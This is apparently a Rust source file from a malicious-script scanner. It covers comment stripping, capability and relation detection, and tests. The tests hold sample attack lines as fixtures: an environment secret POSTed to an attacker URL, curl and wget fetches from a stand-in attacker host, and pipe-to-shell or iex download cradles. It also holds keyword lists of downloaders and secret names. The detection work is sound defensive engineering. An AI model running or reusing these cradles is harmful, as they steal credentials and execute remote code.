use super::manifests::strip_inline_hash_comment;
use super::network::extract_http_urls;
use super::ArtifactLink;
use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::detectors::patterns::{
    line_contains_command_token, line_invokes_powershell_expression_alias,
    line_invokes_shell_or_interpreter, RE_SHELL_SOURCE,
};
use crate::detectors::scripts::{
    detect_deferred_execution, detect_file_secret_to_network_flow, detect_injection_patterns,
    detect_node_process_exec, detect_node_secret_fs_access, detect_powershell_dynamic_exec,
    detect_powershell_persistence, detect_python_exec_network, detect_python_secret_system_access,
    detect_remote_binary_downloads, detect_shell_persistence_write, detect_shell_pipeline_taint,
    detect_shell_side_effects, detect_typosquatted_install, references_dotenv_file,
};
use crate::findings::{
    ArtifactKind, EvidenceKind, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::ports::{AstSignal, AstSignalKind, ScriptLanguage};
use crate::services::ArtifactOrchestratorService;
use std::path::Path;

/// Languages whose comment marker is `#` and whose comments must be
/// stripped before pattern matching. Shell, Python, Ruby, Perl, and
/// YAML all share this convention. Pre-fix the script orchestrator
/// passed raw `content` to every detector, so a benign documentation
/// comment like `echo done  # was: curl https://old/install.sh` would
/// fire `SCRIPT_REMOTE_BINARY_DOWNLOAD` even though `curl` was never
/// executed. The Makefile / Dockerfile orchestrators already strip
/// inline `#` comments via [`strip_inline_hash_comment`]; this list
/// keeps the script side aligned.
const HASH_COMMENT_LANGUAGES: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "fish", "py", "rb", "pl", "yaml", "yml", "ps1", "psm1", "psd1",
];
const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &[
    "curl",
    "wget",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
];

/// Strip inline `#` comments from `content` for the languages in
/// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
/// and column positions of pre-`#` content). The original content is
/// still passed to detectors that need raw evidence text via the
/// `original` argument; only the canonical lowercased view used for
/// pattern matching is normalised here. JS / TS / Node files are left
/// alone — their comment marker is `//` and would require a different
/// stripper that doesn't collide with `https://`.
pub(super) fn strip_comments_for_detection(content: &str, language: &str) -> String {
    if !HASH_COMMENT_LANGUAGES.contains(&language) {
        return content.to_string();
    }
    let mut out = String::with_capacity(content.len());
    let mut first = true;
    for line in content.lines() {
        if !first {
            out.push('\n');
        }
        first = false;
        out.push_str(strip_inline_hash_comment(line));
    }
    if content.ends_with('\n') {
        out.push('\n');
    }
    out
}

pub(crate) fn analyze_script(
    artifact_orchestration: &ArtifactOrchestratorService,
    path: &Path,
    content: &str,
) -> Vec<crate::findings::Finding> {
    let artifact_path = path.display().to_string();
    let language = path
        .extension()
        .and_then(|ext| ext.to_str())
        .map(str::to_ascii_lowercase)
        .unwrap_or_default();
    // Strip inline `#` comments BEFORE deriving the lowercase view so
    // pattern matchers don't fire on commented-out tokens. We preserve
    // line structure (line count + column positions of pre-`#` content)
    // so line-tracked detectors stay accurate, and we feed the
    // *stripped* content to the detectors as their `original` argument
    // too — the `original_match_str` helper requires `lower.len() ==
    // original.len()`, which only holds when both views are derived
    // from the same source string.
    let comment_stripped = strip_comments_for_detection(content, &language);
    let lower = comment_stripped.to_ascii_lowercase();
    let mut findings = Vec::new();

    findings.extend(detect_remote_binary_downloads(
        &lower,
        &comment_stripped,
        &artifact_path,
    ));
    findings.extend(detect_deferred_execution(
        &lower,
        &comment_stripped,
        &artifact_path,
    ));
    findings.extend(detect_node_process_exec(&lower, &language, &artifact_path));
    findings.extend(detect_python_exec_network(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_python_secret_system_access(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_powershell_dynamic_exec(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_powershell_persistence(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_shell_side_effects(&lower, &language, &artifact_path));
    findings.extend(detect_shell_persistence_write(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_node_secret_fs_access(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_file_secret_to_network_flow(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_shell_pipeline_taint(
        &lower,
        &comment_stripped,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_typosquatted_install(
        &lower,
        &language,
        &artifact_path,
    ));
    findings.extend(detect_injection_patterns(
        &lower,
        &comment_stripped,
        &language,
        &artifact_path,
    ));
    // Pass `comment_stripped` (not raw `content`) so the permission/network
    // detector aligns with the rest of the pipeline above. Otherwise a line
    // like `echo done  # was: chmod +x ./payload` would fire the install
    // side-effect rule from a comment, the same FP class the comment-stripping
    // pass exists to prevent.
    findings.extend(artifact_orchestration.permission_and_network_findings(
        path,
        &comment_stripped,
        ArtifactKind::ReferencedArtifact,
    ));

    // AST stage runs on the *raw* `content`, not the comment-stripped /
    // lowercased view: tree-sitter ignores comments structurally, and string
    // mentions of dangerous APIs are tokenised as string literals (not calls),
    // so it does not need the regex-side comment scrubbing.
    findings.extend(ast_findings(
        artifact_orchestration,
        content,
        &language,
        &artifact_path,
    ));

    findings
}

/// Map AST signals from the injected [`ScriptAstAnalyzer`] to findings. Returns
/// empty for languages with no grammar (shell, PowerShell, etc.).
fn ast_findings(
    artifact_orchestration: &ArtifactOrchestratorService,
    content: &str,
    language: &str,
    artifact_path: &str,
) -> Vec<crate::findings::Finding> {
    let Some(lang) = ScriptLanguage::from_extension(language) else {
        return Vec::new();
    };
    artifact_orchestration
        .ast_analyzer()
        .analyze(content, lang)
        .into_iter()
        .map(|signal| ast_signal_to_finding(&signal, artifact_path))
        .collect()
}

fn ast_signal_to_finding(signal: &AstSignal, artifact_path: &str) -> crate::findings::Finding {
    let (rule_id, category, severity, action, evidence_kind) = ast_signal_descriptor(signal.kind);
    crate::findings::Finding::builder(rule_id, category)
        .severity(severity)
        .action(action)
        .evidence_kind(evidence_kind)
        .matched_on(MatchTarget::ReferencedFile {
            path: artifact_path.to_string(),
        })
        .artifact(
            ArtifactKind::ReferencedArtifact,
            Some(artifact_path.to_string()),
        )
        .match_value(signal.evidence.clone())
        .reason(ast_signal_reason(signal.kind))
        .line(signal.line)
        .build()
}

/// `(rule_id, category, severity, action, evidence_kind)` for each signal.
/// The two novel high-signal catches a regex cannot make —
/// `IndirectBuiltinAccess` and `StringToCodeFlow` — block; the constructs a
/// regex already covers stay advisory so they do not double-count into the
/// verdict.
fn ast_signal_descriptor(
    kind: AstSignalKind,
) -> (
    &'static str,
    ThreatCategory,
    Severity,
    RecommendedAction,
    EvidenceKind,
) {
    match kind {
        AstSignalKind::DynamicCodeExecution => (
            "AST_DYNAMIC_CODE_EXECUTION",
            ThreatCategory::RemoteExec,
            Severity::Medium,
            RecommendedAction::RequireApproval,
            EvidenceKind::Behavior,
        ),
        AstSignalKind::ProcessExecution => (
            "AST_PROCESS_EXECUTION",
            ThreatCategory::RemoteExec,
            Severity::Low,
            RecommendedAction::Log,
            EvidenceKind::Context,
        ),
        AstSignalKind::DynamicImport => (
            "AST_DYNAMIC_IMPORT",
            ThreatCategory::Obfuscation,
            Severity::Low,
            RecommendedAction::Log,
            EvidenceKind::Context,
        ),
        AstSignalKind::IndirectBuiltinAccess => (
            "AST_INDIRECT_BUILTIN_ACCESS",
            ThreatCategory::Obfuscation,
            Severity::High,
            RecommendedAction::Block,
            EvidenceKind::Behavior,
        ),
        AstSignalKind::StringToCodeFlow => (
            "AST_STRING_TO_CODE_FLOW",
            ThreatCategory::Obfuscation,
            Severity::High,
            RecommendedAction::Block,
            EvidenceKind::Behavior,
        ),
    }
}

fn ast_signal_reason(kind: AstSignalKind) -> &'static str {
    match kind {
        AstSignalKind::DynamicCodeExecution => {
            "dynamic code evaluation (exec/eval/compile family) parsed from the script AST"
        }
        AstSignalKind::ProcessExecution => {
            "process-spawning call parsed from the script AST"
        }
        AstSignalKind::DynamicImport => {
            "dynamic import of a computed module name parsed from the script AST"
        }
        AstSignalKind::IndirectBuiltinAccess => {
            "indirect access to interpreter builtins (getattr/globals) — an obfuscation a literal pattern cannot see"
        }
        AstSignalKind::StringToCodeFlow => {
            "a constructed string flows into a dynamic-evaluation call in the same expression"
        }
    }
}

pub(crate) fn script_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let lower = content.to_ascii_lowercase();
    let mut capabilities = Vec::new();

    // Mirror the `ConnectsTo` relation in `script_relations`: raw-socket
    // networking (`socket.`) is a network capability too, so a secret read
    // piped over a bare socket still raises the secret+network combo.
    if lower.lines().any(line_contains_download_command)
        || lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("socket.")
        || lower.contains("http.client")
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }

    if lower.lines().any(line_invokes_shell_or_interpreter)
        || lower.lines().any(line_contains_package_install_command)
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::InstallExecution,
        ));
    }

    if lower.contains("subprocess.")
        || lower.contains("os.system(")
        || lower.contains("os.execvp(")
        || lower.contains("os.execvpe(")
        || lower.contains("child_process.exec(")
        || lower.contains("child_process.spawn(")
        || lower.contains("child_process.execsync(")
        || lower.contains("child_process.spawnsync(")
        || lower.contains("spawn(")
        || lower.contains("exec(")
        || lower.contains("start-process")
        // Cross-language process-exec idioms. `exec.Command(` (Go) and
        // `Command::new(` (Rust) do NOT contain the bare exec-call substring, and
        // `popen(`/`proc_open(`/`passthru(` (Python os.popen, Ruby IO.popen, PHP)
        // were uncovered — so a download->exec cradle in those languages never
        // raised ProcessExecution and the composite never formed.
        || lower.contains("exec.command(")
        || lower.contains("command::new(")
        || lower.contains("popen(")
        || lower.contains("proc_open(")
        || lower.contains("passthru(")
        || lower.lines().any(line_invokes_powershell_expression_alias)
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::ProcessExecution,
        ));
    }

    if lower.contains("process.env")
        || lower.contains("os.environ")
        || lower.contains("getenv(")
        || references_dotenv_file(&lower)
        || lower.contains("access_token")
        || lower.contains("api_token")
        || lower.contains("auth_token")
        || lower.contains("bearer_token")
        || lower.contains("secret_key")
        || lower.contains("client_secret")
        || lower.contains("_authtoken")
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::SecretAccess,
        ));
    }

    if lower.contains("crontab")
        || lower.contains("schtasks")
        || lower.contains("launchctl")
        || lower.contains("runonce")
        || lower.contains("autostart")
        || lower.contains("register-scheduledtask")
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::PersistenceSurface,
        ));
    }

    if lower.contains("writefilesync(")
        || lower
            .lines()
            .any(|line| line_contains_command_token(line, "tee"))
        || contains_shell_append_redirect(&lower)
        || lower.contains("> /etc/")
        || lower.contains("set-content")
    {
        capabilities.push(ArtifactOrchestratorService::observed_capability(
            ArtifactCapability::FilesystemWrite,
        ));
    }

    capabilities
}

/// `true` when `lower` contains a shell **append-redirect** (`>>`) followed
/// by a filename rather than a bitshift / right-shift operand.
///
/// Pre-fix the orchestrator used a bare `lower.contains(">>")`, which fired
/// on perfectly benign code paths in any language: Python `flags >> 3`,
/// Rust `x >> 2`, JavaScript `value >> 8`, Markdown blockquote-style prose
/// like `>> note: …`. The spurious `FilesystemWrite` capability inflated
/// the artifact graph and, when the same script also had `SecretAccess`,
/// produced false `SecretExfiltration` taint chains that pushed Benign
/// packages toward Malicious — a weaponisable false positive.
///
/// Heuristic: a real shell append-redirect is followed (after optional
/// whitespace) by a *non-digit* character — typically `/`, `~`, `$`,
/// `"`, `'`, or an identifier byte. Bitshift right is, by contrast,
/// always followed by a numeric literal or an identifier-as-operand
/// pattern that starts with a digit-or-let-binding (`x >> 2`,
/// `flags >> SHIFT_BITS`). The let-binding case (`>> SHIFT_BITS`) cannot
/// be disambiguated lexically, so we accept that residual FP — it is
/// orders of magnitude rarer than `>> filename`. When the next char is
/// a digit OR end-of-input we drop the match. When the next char is
/// alphabetic, we additionally require that the byte before `>>` is NOT
/// an identifier byte; a true shell redirect either follows whitespace
/// (`echo x >> file`) or end-of-line, never `value>>shift` style code.
fn contains_shell_append_redirect(lower: &str) -> bool {
    let bytes = lower.as_bytes();
    let mut search_start = 0;
    while let Some(rel) = lower[search_start..].find(">>") {
        let abs = search_start + rel;
        let after_idx = abs + 2;
        // Use checked_sub instead of wrapping_sub: when `>>` appears at
        // position 0, there is no preceding byte, and `checked_sub(1)`
        // correctly returns `None` rather than wrapping to `usize::MAX`.
        let before = abs.checked_sub(1).and_then(|i| bytes.get(i).copied());
        let after_run = lower[after_idx..]
            .bytes()
            .find(|b| *b != b' ' && *b != b'\t');
        match after_run {
            // End-of-input: `>>` with no following non-whitespace is a shell
            // redirect (it would be a syntax error as a bitshift, since
            // there is no right operand). Newline after `>>` followed by
            // whitespace is ambiguous, so we still treat it as bitshift-like.
            None => return true,
            Some(b'\n') | Some(b'\r') => {}
            // Digit ⇒ definitely a bitshift right (e.g. `x >> 8`).
            Some(b'0'..=b'9') => {}
            // Path-like / quoted / variable / leading-tilde / leading-slash ⇒
            // unambiguous shell append-redirect.
            Some(b'/' | b'~' | b'$' | b'"' | b'\'' | b'.') => return true,
            // Identifier byte ⇒ only treat as redirect when the byte BEFORE
            // `>>` is whitespace or start-of-input. `value>>shift` (no
            // surrounding spaces) is bitshift; `echo x >> file` is redirect.
            Some(b) if b.is_ascii_alphabetic() || b == b'_' => match before {
                None | Some(b' ' | b'\t' | b'\n' | b'\r') => return true,
                _ => {}
            },
            _ => {}
        }
        search_start = abs + 2;
    }
    false
}

pub(crate) fn script_relations(content: &str) -> Vec<ArtifactLink> {
    let lower = content.to_ascii_lowercase();
    let mut links = Vec::new();
    if lower.lines().any(line_contains_download_command) {
        links.push(ArtifactLink {
            target: "remote-resource".to_string(),
            relation: ArtifactRelation::Downloads,
        });
    }
    // Mirror `script_capabilities`: every pattern that declares
    // `ProcessExecution` MUST also produce an `Executes` edge here.
    // Pre-fix `script_relations` omitted `exec(`, `os.system(`, `spawn(`,
    // and the `iex` alias, so a script calling `os.system("curl " + secret)`
    // declared ProcessExecution but had no Executes edge — composite
    // capabilities and taint chains silently lost the link.
    if lower.lines().any(line_invokes_shell_or_interpreter)
        || lower.contains("start-process")
        || lower.contains("subprocess.")
        || lower.contains("os.system(")
        || lower.contains("exec(")
        || lower.contains("spawn(")
        || lower.contains("child_process")
        || lower.contains("os.execvp(")
        || lower.contains("os.execvpe(")
        // Cross-language process-exec idioms — kept in lockstep with
        // `script_capabilities` (Go `exec.Command(`, Rust `Command::new(`,
        // Python/Ruby/PHP `popen(`/`proc_open(`/`passthru(`) so the Executes
        // edge forms and the download->exec composite is not lost.
        || lower.contains("exec.command(")
        || lower.contains("command::new(")
        || lower.contains("popen(")
        || lower.contains("proc_open(")
        || lower.contains("passthru(")
        || lower.lines().any(line_invokes_powershell_expression_alias)
    {
        links.push(ArtifactLink {
            target: "process".to_string(),
            relation: ArtifactRelation::Executes,
        });
    }
    if lower
        .lines()
        .any(|line| line_contains_command_token(line, "import"))
        || lower.contains("require(")
        || lower
            .lines()
            .any(|line| line_contains_command_token(line, "source"))
        || RE_SHELL_SOURCE.is_match(&lower)
    {
        links.push(ArtifactLink {
            target: "runtime-module".to_string(),
            relation: ArtifactRelation::Loads,
        });
    }
    if lower.contains("crontab")
        || lower.contains("schtasks")
        || lower.contains("launchctl")
        || lower.contains("runonce")
        || lower.contains("autostart")
        || lower.contains("register-scheduledtask")
    {
        links.push(ArtifactLink {
            target: "persistence-surface".to_string(),
            relation: ArtifactRelation::Persists,
        });
    }
    // Emit the actual matched URL(s) as the `ConnectsTo` target rather than a
    // bare `"network"` placeholder. The taint sink classifier
    // (`is_real_external_sink`) needs the URL to apply its registry /
    // software-distribution / local / documentation-host carve-outs; a
    // placeholder target matches none of them, so `endpoint_kind == None` plus
    // `to == "network"` was classified as a NON-external sink — meaning the
    // secret→external-network and identity→external-network taint rules could
    // never fire on a script (e.g. `os.environ[...]` read + `requests.post`
    // to an attacker URL). Raw-socket networking (`socket.`) has no URL to
    // classify, so it keeps the placeholder: forcing it external would
    // false-positive on the common local-socket case.
    let url_targets = extract_http_urls(content);
    let has_url_target = !url_targets.is_empty();
    for url in url_targets {
        links.push(ArtifactLink {
            target: url,
            relation: ArtifactRelation::ConnectsTo,
        });
    }
    if !has_url_target && lower.contains("socket.") {
        links.push(ArtifactLink {
            target: "network".to_string(),
            relation: ArtifactRelation::ConnectsTo,
        });
    }
    if lower.contains("open(")
        || lower.contains("readfilesync(")
        || lower
            .lines()
            .any(|line| line_contains_command_token(line, "cat"))
        || lower
            .lines()
            .any(|line| line_contains_command_token(line, "rg"))
    {
        links.push(ArtifactLink {
            target: "filesystem".to_string(),
            relation: ArtifactRelation::Reads,
        });
    }
    if lower.contains("writefilesync(")
        || lower
            .lines()
            .any(|line| line_contains_command_token(line, "tee"))
        || contains_shell_append_redirect(&lower)
        || lower.contains("> /etc/")
        || lower.contains("set-content")
    {
        links.push(ArtifactLink {
            target: "filesystem".to_string(),
            relation: ArtifactRelation::Writes,
        });
    }
    if lower.contains("process.env")
        || lower.contains("os.environ")
        || lower.contains("getenv(")
        || references_dotenv_file(&lower)
        || lower.contains("access_token")
        || lower.contains("api_token")
        || lower.contains("auth_token")
        || lower.contains("bearer_token")
        || lower.contains("secret_key")
        || lower.contains("client_secret")
        || lower.contains("_authtoken")
    {
        links.push(ArtifactLink {
            target: "secrets".to_string(),
            relation: ArtifactRelation::AccessesSecrets,
        });
    }
    links
}

fn line_contains_download_command(line: &str) -> bool {
    SCRIPT_DOWNLOAD_COMMAND_TOKENS
        .iter()
        .any(|token| line_contains_command_token(line, token))
}

fn line_contains_package_install_command(line: &str) -> bool {
    let mut previous = None;
    for token in line.split_whitespace().map(normalized_command_token) {
        let has_install_pair = matches!(
            (previous, token),
            (Some("npm" | "pip" | "cargo"), "install")
        );
        if has_install_pair {
            return true;
        }
        previous = Some(token);
    }
    false
}

fn normalized_command_token(token: &str) -> &str {
    let stem = token
        .trim_matches(['"', '\'', '`'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(token);
    stem.trim_matches(['|', ';', '&'])
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn relation_target_present(links: &[ArtifactLink], target: &str) -> bool {
        links.iter().any(|link| link.target == target)
    }

    /// Contract: cross-language process-exec idioms raise ProcessExecution so a
    /// download->exec cradle in Go/Rust/PHP/Ruby forms the same composite as the
    /// Python/JS equivalents.
    #[test]
    fn script_capabilities_detects_cross_language_process_exec() {
        for content in [
            "resp, _ := http.Get(u)\nexec.Command(\"sh\", \"-c\", body).Run()\n",
            "let out = std::process::Command::new(\"sh\").arg(\"-c\").output();\n",
            "$h = popen($cmd, 'r');\n",
            "proc_open($cmd, $d, $p);\n",
            "passthru($cmd);\n",
        ] {
            assert!(
                capability_present(
                    &script_capabilities(content),
                    ArtifactCapability::ProcessExecution
                ),
                "process-exec idiom must raise ProcessExecution for {content:?}",
            );
        }
    }

    /// Contract (negative): ordinary words that merely contain an exec-idiom
    /// substring must not raise ProcessExecution.
    #[test]
    fn script_capabilities_skips_exec_idiom_lookalikes() {
        let content = "let reopener = make_reopen();\n// command line docs\n";
        assert!(
            !capability_present(
                &script_capabilities(content),
                ArtifactCapability::ProcessExecution
            ),
            "lookalike words must not raise ProcessExecution",
        );
    }

    /// Contract: a script invoking `bash install.sh` produces InstallExecution.
    #[test]
    fn script_capabilities_detects_bash_token() {
        let content = "bash install.sh\n";
        let caps = script_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// Contract: a script that begins with bare `sh install.sh` (column 0,
    /// no leading space) produces InstallExecution. Anchors the column-0
    /// false-negative fix from the prior conservative `" sh "` pattern.
    #[test]
    fn script_capabilities_detects_sh_at_column_zero() {
        let content = "sh install.sh\n";
        let caps = script_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// Contract: an `npm run publish` script must NOT produce
    /// InstallExecution via the shell-token detector — `publish` is an
    /// English word, not a shell invocation.
    #[test]
    fn script_capabilities_skips_publish_word() {
        let content = "npm run publish\n";
        let caps = script_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// Contract: interpreter names passed as ordinary arguments do not
    /// declare install execution.
    #[test]
    fn script_capabilities_rejects_echoed_interpreter_argument() {
        let content = "echo bash install.sh\n";
        let caps = script_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// Contract: the multi-word phrase `npm install` still produces
    /// InstallExecution via the dedicated phrase clause, separate from
    /// the shell-token helper. Pins the separation so a future refactor
    /// doesn't accidentally fold install phrases into the helper.
    #[test]
    fn script_capabilities_keeps_npm_install_phrase() {
        let content = "npm install foo\n";
        let caps = script_capabilities(content);
        assert!(capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// # Contract
    ///
    /// Package-manager install phrases still produce InstallExecution when
    /// command words are separated by tabs.
    #[test]
    fn script_capabilities_detects_tab_separated_install_phrase() {
        for content in [
            "npm\tinstall foo\n",
            "pip\tinstall ./dist/pkg.whl\n",
            "/usr/bin/cargo\tinstall tool\n",
        ] {
            let caps = script_capabilities(content);
            assert!(
                capability_present(&caps, ArtifactCapability::InstallExecution),
                "{content:?} must produce InstallExecution; got {caps:?}"
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Package-manager install phrase detection is token-aware.
    #[test]
    fn script_capabilities_rejects_install_phrase_substrings() {
        let content = "benpm\tinstall foo\n";
        let caps = script_capabilities(content);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::InstallExecution
        ));
    }

    /// Contract: a script invoking `bash` produces an Executes relation.
    #[test]
    fn script_relations_detects_bash_token() {
        let content = "bash install.sh\n";
        let links = script_relations(content);
        assert!(relation_target_present(&links, "process"));
    }

    /// Contract: shell separators create command positions for relation
    /// inference.
    #[test]
    fn script_relations_detects_pipe_joined_shell_token() {
        let content = "curl|bash\n";
        let links = script_relations(content);
        assert!(relation_target_present(&links, "process"));
    }

    /// Contract: interpreter names passed as ordinary arguments do not
    /// produce an Executes relation.
    #[test]
    fn script_relations_rejects_echoed_interpreter_argument() {
        let content = "echo bash install.sh\n";
        let links = script_relations(content);
        assert!(!relation_target_present(&links, "process"));
    }

    /// Contract: an `npm run publish` script must NOT produce an Executes
    /// relation. Anchors the false-positive fix on the relations side.
    #[test]
    fn script_relations_skips_publish_word() {
        let content = "npm run publish\n";
        let links = script_relations(content);
        assert!(!relation_target_present(&links, "process"));
    }

    /// Contract: text mentioning `make finish` (English usage) must NOT
    /// produce an Executes relation.
    #[test]
    fn script_relations_skips_finish_step() {
        let content = "echo \"please finish setup\"\n";
        let links = script_relations(content);
        assert!(!relation_target_present(&links, "process"));
    }

    /// # Contract
    ///
    /// Load-command matching accepts tabs between command names and their
    /// module or file argument.
    #[test]
    fn script_relations_accepts_tab_separated_load_commands() {
        for content in ["import\tos\n", "source\t.envrc\n"] {
            let links = script_relations(content);
            assert!(
                links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Loads)),
                "{content:?} must produce a Loads edge; got {links:?}"
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Load-command matching rejects lookalike command names.
    #[test]
    fn script_relations_rejects_load_command_substrings() {
        for content in ["important\tos\n", "resource\t.envrc\n"] {
            let links = script_relations(content);
            assert!(
                !links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Loads)),
                "{content:?} must not produce a Loads edge; got {links:?}"
            );
        }
    }

    /// Contract: a script invoking `iex $cmd` (PowerShell alias for
    /// `Invoke-Expression`) MUST produce an `Executes` relation, paralleling
    /// the `ProcessExecution` capability flag in `script_capabilities`.
    /// Pre-fix the relations omitted `iex `, so a script declared the
    /// capability without the matching graph edge — composite capabilities
    /// (e.g. `ShellDownloadExec`) silently lost the chain.
    #[test]
    fn script_relations_records_executes_for_iex_alias() {
        let content = "iex $payload\n";
        let links = script_relations(content);
        assert!(
            relation_target_present(&links, "process"),
            "`iex $payload` must produce an Executes edge; got {links:?}",
        );
    }

    /// Contract: capability and relation paths agree on `iex `. Positive
    /// pin so a future refactor cannot silently drop one but keep the
    /// other.
    #[test]
    fn iex_flips_both_capability_and_relation() {
        let content = "iex $payload\n";
        let caps = script_capabilities(content);
        let links = script_relations(content);
        assert!(caps
            .iter()
            .any(|c| c.capability == ArtifactCapability::ProcessExecution));
        assert!(relation_target_present(&links, "process"));
    }

    /// # Contract
    ///
    /// Tabs are valid separators after PowerShell's `IEX` alias. Capability
    /// and relation enrichment must agree on that command form.
    #[test]
    fn iex_tab_flips_both_capability_and_relation() {
        let content = "iex\t$payload\n";
        let caps = script_capabilities(content);
        let links = script_relations(content);
        assert!(caps
            .iter()
            .any(|c| c.capability == ArtifactCapability::ProcessExecution));
        assert!(relation_target_present(&links, "process"));
    }

    /// # Contract (negative)
    ///
    /// PowerShell `IEX` alias matching is token-aware. Longer identifiers
    /// containing the same bytes do not imply process execution.
    #[test]
    fn iex_substring_does_not_flip_capability_or_relation() {
        let content = "prefixiex\t$payload\n";
        let caps = script_capabilities(content);
        let links = script_relations(content);
        assert!(!caps
            .iter()
            .any(|c| c.capability == ArtifactCapability::ProcessExecution));
        assert!(!relation_target_present(&links, "process"));
    }

    /// Contract: the `os.exec*` family raises BOTH the ProcessExecution
    /// capability and the Executes relation. Pre-fix `os.execvp(` /
    /// `os.execvpe(` were listed only in `script_capabilities` (and do not
    /// contain the `exec(` substring the relation path matched on), so the
    /// capability fired with no matching graph edge — violating the
    /// documented "every ProcessExecution pattern must produce an Executes
    /// edge" contract.
    #[test]
    fn os_exec_family_flips_both_capability_and_relation() {
        for content in ["os.execvp(prog, args)\n", "os.execvpe(prog, args, env)\n"] {
            let caps = script_capabilities(content);
            let links = script_relations(content);
            assert!(
                caps.iter()
                    .any(|c| c.capability == ArtifactCapability::ProcessExecution),
                "{content:?} must raise ProcessExecution",
            );
            assert!(
                relation_target_present(&links, "process"),
                "{content:?} must produce an Executes edge",
            );
        }
    }

    /// # Contract
    ///
    /// A script that connects over HTTP(S) MUST emit the *actual matched
    /// URL* as the `ConnectsTo` target, not a bare `"network"` placeholder.
    /// The taint sink classifier keys on the URL to apply its registry /
    /// software-distribution / local / documentation carve-outs; a
    /// placeholder matches none of them and is classified as a non-external
    /// sink, so the secret→external-network exfil rule could never fire on a
    /// script (env-var secret read + `requests.post` to an attacker URL).
    #[test]
    fn http_connection_emits_actual_url_target_not_placeholder() {
        let content = "import os, requests\n\
            token = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n\
            requests.post(\"https://attacker-controlled.io/exfil\", data={\"t\": token})\n";
        let links = script_relations(content);
        assert!(
            links
                .iter()
                .any(|l| l.target == "https://attacker-controlled.io/exfil"
                    && matches!(l.relation, ArtifactRelation::ConnectsTo)),
            "the real URL must be the ConnectsTo target, got {links:?}"
        );
        assert!(
            !relation_target_present(&links, "network"),
            "a script with a real URL must not emit the bare `network` placeholder"
        );
    }

    /// # Contract (end-to-end)
    ///
    /// The graph facts a script emits (secret source + external-URL sink)
    /// MUST drive the `ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK` rule. This
    /// pins the integration the placeholder bug silently broke: a script
    /// reading an env secret and POSTing it to an attacker URL is exfil.
    #[test]
    fn script_env_secret_to_external_url_fires_taint_rule() {
        let content = "import os, requests\n\
            token = os.environ[\"AWS_SECRET_ACCESS_KEY\"]\n\
            requests.post(\"https://attacker-controlled.io/exfil\", data={\"t\": token})\n";

        let mut graph = crate::artifact_graph::ArtifactGraph::new();
        graph.add_node_with_capabilities(
            "collect.py",
            ArtifactKind::ReferencedArtifact,
            script_capabilities(content),
        );
        for link in script_relations(content) {
            graph.add_edge("collect.py", &link.target, link.relation);
        }

        let findings = crate::artifact_taint::derive_taint_findings(&graph, &[]);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK"),
            "env-secret→external-URL script must fire the exfil taint rule, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    /// Contract: raw-socket networking (`socket.`) raises BOTH the
    /// NetworkAccess capability and the ConnectsTo relation. Pre-fix
    /// `socket.` produced only the relation edge, so a secret read over a
    /// bare socket lost the secret+network capability combo weight.
    #[test]
    fn raw_socket_flips_both_capability_and_relation() {
        let content = "import socket\ns = socket.socket()\n";
        let caps = script_capabilities(content);
        let links = script_relations(content);
        assert!(
            capability_present(&caps, ArtifactCapability::NetworkAccess),
            "socket. must raise NetworkAccess",
        );
        assert!(
            relation_target_present(&links, "network"),
            "socket. must produce a ConnectsTo edge",
        );
    }

    /// # Contract
    ///
    /// Tabs and shell operators are valid command separators. Downloader
    /// commands using them still produce NetworkAccess and Downloads
    /// graph evidence.
    #[test]
    fn script_download_command_matching_accepts_tabs_and_pipe_boundaries() {
        for content in [
            "curl\thttps://attacker.example/tool.sh\n",
            "wget\thttps://attacker.example/tool.sh\n",
            "curl|bash\n",
            "exec('curl\t$PAYLOAD_URL | sh')\n",
            "iwr\t$PAYLOAD_URL | iex\n",
            "iwr($PAYLOAD_URL) | iex\n",
            "Invoke-RestMethod\t$PAYLOAD_URL | iex\n",
            "irm($PAYLOAD_URL) | iex\n",
        ] {
            let caps = script_capabilities(content);
            assert!(
